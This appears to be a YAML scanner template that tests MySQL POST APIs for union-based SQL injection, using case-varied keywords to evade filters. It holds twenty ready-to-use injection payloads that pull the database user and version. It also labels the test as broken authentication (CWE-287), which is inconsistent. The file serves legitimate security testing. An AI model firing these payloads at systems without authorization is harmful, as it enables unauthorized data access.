id: UNION_CASE_CHANGE_BASED_MYSQL_SQLI_POST
info:
  name: "Union based SQL Injection test with case change variations for MySQL on POST method APIs"
  description: "Union Based SQL Injection Test with Case Change Variations for MySQL on POST Method APIs involves testing SQL injection vulnerabilities by altering the case of SQL keywords in the query. This method checks if the application properly handles case sensitivity in SQL queries when processing user inputs. By modifying the case of SQL keywords, the test attempts to bypass basic input validation mechanisms that might be case-sensitive, revealing potential injection points that could lead to unauthorized data access or manipulation."
  details: "This test examines SQL injection vulnerabilities in POST method APIs by altering the case of SQL keywords (e.g., changing `SELECT` to `select`) within the request payload. The goal is to determine if the applicationâ€™s input validation or query parsing mechanisms are case-sensitive. If the server fails to properly handle these variations, it could allow an attacker to inject malicious SQL code, leading to data leakage, unauthorized access, or other types of SQL injection attacks. The test specifically targets MySQL databases where case sensitivity could be exploited for bypassing filters."
  impact: "The impact of a successful Union-based SQL injection test with case change variations on POST method APIs can lead to unauthorized access to sensitive data stored in a MySQL database. Attackers may exploit this vulnerability to retrieve, modify, or delete data, potentially including user credentials or confidential information. Additionally, if combined with other attack vectors, this vulnerability could enable further exploits, such as privilege escalation or code execution, posing a significant threat to the integrity and confidentiality of the application."

  category:
    name: NO_AUTH
    shortName: Broken Authentication
    displayName: Broken User Authentication (BUA)
  subCategory: UNION_CASE_CHANGE_BASED_MYSQL_SQLI_POST
  severity: MEDIUM
  tags:
    - Business logic
    - OWASP top 10
    - HackerOne top 10
  references:
    - "https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/"
    - "https://github.com/OWASP/API-Security/blob/master/editions/2023/en/0xa2-broken-authentication.md"
    - "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"
  cwe:
    - CWE-287
  cve:
    - CVE-2020-24008
    - CVE-2021-45901

attributes:
  nature: INTRUSIVE
  plan: PRO
  duration: FAST
compliance_standards: compliance/bua.conf

api_selection_filters:
  method:
    eq: "POST"
  response_code:
    gte: 200
    lt: 300
  response_payload:
    length:
      gt: 0
    not_contains:
      - Error
      - Internal Server
      - Failed
      - Unauthorized
      - access denied
      - Forbidden
      - Method Not allowed
      - Gateway timeout
      - request timeout
      - server error
      - server busy
      - authentication error
      - authorization error
      - validation error
      - Permission Denied
      - invalid token
      - token expired
      - session expired
      - session timeout
      - unexpected error
      - unable to process request
      - bad request
      - service unavailable
      - account is locked
      - account is blocked
      - multiple failed attempts

  request_payload:
    for_one:
      key:
        regex: ".*"
        extract: userKey
      value:
        extract: userVal
wordLists:
  unionBasedPayloads:
    - "' unIon SeLeCt 1, user(), version()--"
    - "' UNIon seLeCt 1, user(), version()--"
    - "' UnIon SELEct 1, user(), version()--"
    - "' uniON SELect 1, user(), version()--"
    - "' Union SeLeCt 1, user(), version()--"
    - "' UNION selEct 1, user(), version()--"
    - "' unION SELect 1, user(), version()--"
    - "' uNion sELEct 1, user(), version()--"
    - "' UnIon sElEcT 1, user(), version()--"
    - "' unIoN sElEcT 1, user(), version()--"
  unionBasedNegativePayloads:
    - "' unIon SeLeCt 1, user(), version() where 1=0 --"
    - "' UNIon seLeCt 1, user(), version() where 1=0 --"
    - "' UnIon SELEct 1, user(), version() where 1=0 --"
    - "' uniON SELect 1, user(), version() where 1=0 --"
    - "' Union SeLeCt 1, user(), version() where 1=0 --"
    - "' UNION selEct 1, user(), version() where 1=0 --"
    - "' unION SELect 1, user(), version() where 1=0 --"
    - "' uNion sELEct 1, user(), version() where 1=0 --"
    - "' UnIon sElEcT 1, user(), version() where 1=0 --"
    - "' unIoN sElEcT 1, user(), version() where 1=0 --"
execute:
  type: multiple
  requests:
    - req:
        - modify_body_param:
            userKey: ${userVal}${unionBasedPayloads}
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              contains_either:
                - "version"
              not_contains:
                - Error
                - Internal Server
                - Fail
                - Unauthorized
                - access denied
                - Forbidden
                - Method Not allowed
                - Gateway timeout
                - request timeout
                - server error
                - server busy
                - authentication error
                - authorization error
                - validation error
                - Permission Denied
                - invalid
                - token expired
                - session expired
                - session timeout
                - unexpected error
                - unable to process request
                - bad request
                - service unavailable
                - account is locked
                - account is blocked
                - multiple failed attempts
                - Attention Required!
                - CloudFlare
                - Sorry, you have been blocked
                - " UNION SELECT "
                - <html>
                - </html>
        - success: x2
        - failure: exit
    - req:
        - modify_body_param:
            userKey: ${unionBasedNegativePayloads}
        - validate:
            response_code:
              gte: 200
              lt: 300
            response_payload:
              length:
                gt: 0
              not_contains:
                - Error
                - Internal Server
                - Fail
                - Unauthorized
                - access denied
                - Forbidden
                - Method Not allowed
                - Gateway timeout
                - request timeout
                - server error
                - server busy
                - authentication error
                - authorization error
                - validation error
                - Permission Denied
                - invalid
                - token expired
                - session expired
                - session timeout
                - unexpected error
                - unable to process request
                - bad request
                - service unavailable
                - account is locked
                - account is blocked
                - multiple failed attempts
                - Attention Required!
                - CloudFlare
                - Sorry, you have been blocked
                - " UNION SELECT "
                - "version"
                - <html>
                - </html>
              neq: "${x1.response.body}"
        - success: vulnerable
        - failure: exit


